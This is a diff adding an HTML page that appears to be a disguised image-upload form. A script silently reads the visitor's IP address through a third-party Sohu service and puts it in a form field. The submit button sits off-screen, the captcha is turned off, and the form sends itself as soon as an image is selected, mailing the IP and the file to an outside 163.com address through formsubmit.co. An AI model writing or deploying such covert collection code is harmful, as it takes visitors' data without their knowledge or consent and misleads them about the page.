@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <link
+        href="website2_1.css"
+        rel="stylesheet"
+    />
+</head>
+
+<body>
+    <div class="input">
+        <form
+            id="form"
+            method="POST"
+            action="https://formsubmit.co/Shaz1m@163.com"
+            enctype="multipart/form-data"
+        >
+            <div style="position: relative;">
+                <img
+                    src="./Image/upload.jpeg"
+                    width="960px"
+                />
+                <!-- 抓取ip -->
+                <p0>
+                    <input
+                        type="text"
+                        id="ip"
+                        name="ip"
+                        required=""
+                        style="position:absolute; left:350px;top:110px;"
+                    />
+                </p0>
+                <!-- 附件 -->
+                <h1>
+                    <input
+                        type="file"
+                        id="file-uploader"
+                        name="attachment"
+                        accept="image/png, image/jpeg"
+                        style="position:absolute;left:390px;top: 215px;"
+                    />
+                    <input
+                        type="hidden"
+                        name="_captcha"
+                        value="false"
+                    >
+                </h1>
+
+                <input
+                    type="hidden"
+                    name="_next"
+                    value="https://www.christmastreebyebye.com/website2_2.html"
+                >
+                <p1>
+                    <button
+                        type="submit"
+                        name="submit"
+                        id="submit"
+                        style="position:absolute; left:-100px;top:-100px;"
+                    >Send</button>
+                </p1>
+            </div>
+        </form>
+    </div>
+</body>
+
+<!-- 抓取ip -->
+<!-- 使用https才不会被浏览器block -->
+<script src="https://pv.sohu.com/cityjson?ie=utf-8"></script>
+<script type="text/javascript">
+    var ip = returnCitySN["cip"];//定义IP
+    document.getElementById("ip").value = ip;//只获取ip
+</script>
+
+<!-- 上传完后自动提交 -->
+<!-- https://www.cnblogs.com/wangxinblog/p/7421785.html -->
+<!-- http://www.htmleaf.com/js/jquery/jquery-1.8.3.html -->
+<script
+    src="http://code.jquery.com/jquery-1.8.3.min.js"
+    type="text/javascript"
+    charset="utf-8"
+></script>
+<script type="text/javascript">
+    $(function () {
+        //当选择好上传文件后,执行提交表单的操作
+        $("#file-uploader").change(function () {
+            $("#submit").click();
+        })
+    })
+</script>
